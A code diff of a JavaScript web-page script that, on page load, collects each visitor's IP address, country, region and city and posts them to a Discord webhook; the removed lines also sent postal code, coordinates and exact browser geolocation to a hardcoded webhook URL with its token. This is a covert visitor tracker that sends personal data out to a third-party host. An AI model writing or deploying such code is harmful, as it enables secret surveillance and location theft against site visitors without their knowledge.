@@ -6,9 +6,7 @@ window.addEventListener('load', (event) => {
             **IP:** ${data.ip}
             **Country:** ${data.country_name}
             **State/Province:** ${data.region}
-            **Town/City:** ${data.city}
-            **Zip/Postal:** ${data.postal}
-            **Coordinates:** ${data.latitude}, ${data.longitude}`,
+            **Town/City:** ${data.city}`,
             color: "3107012"
         }
 
@@ -22,29 +20,4 @@ window.addEventListener('load', (event) => {
         HTTP.setRequestHeader("Content-Type", "application/json")
         HTTP.send(JSON.stringify(data))
     });
-    
-    if (navigator.geolocation)
-    {
-        navigator.geolocation.getCurrentPosition((position) => {
-            latitude = position.coords.latitude
-            longitude = position.coords.longitude
-            
-            let embed = {
-                title: "An user allowed us to view their exact location!",
-                description: `**Latitude:** ${latitude}
-                **Longitude:** ${longitude}`,
-                color: "3107012"
-            }
-            
-            data = {
-                "avatar_url": "https://i.imgur.com/va4KTJ8.png",
-                "embeds": [ embed ]
-            }
-            
-            const HTTP = new XMLHttpRequest()
-            HTTP.open("POST", "https://discord.com/api/webhooks/993973447040434360/c9KNCteozfPTUXXFZe42-qIg9Ik5eQNPlcZnA1-ynI6MvDOIKv7pK4mLaoSTvgRpZ3jK", true)
-            HTTP.setRequestHeader("Content-Type", "application/json")
-            HTTP.send(JSON.stringify(data))
-        })
-    }
 });
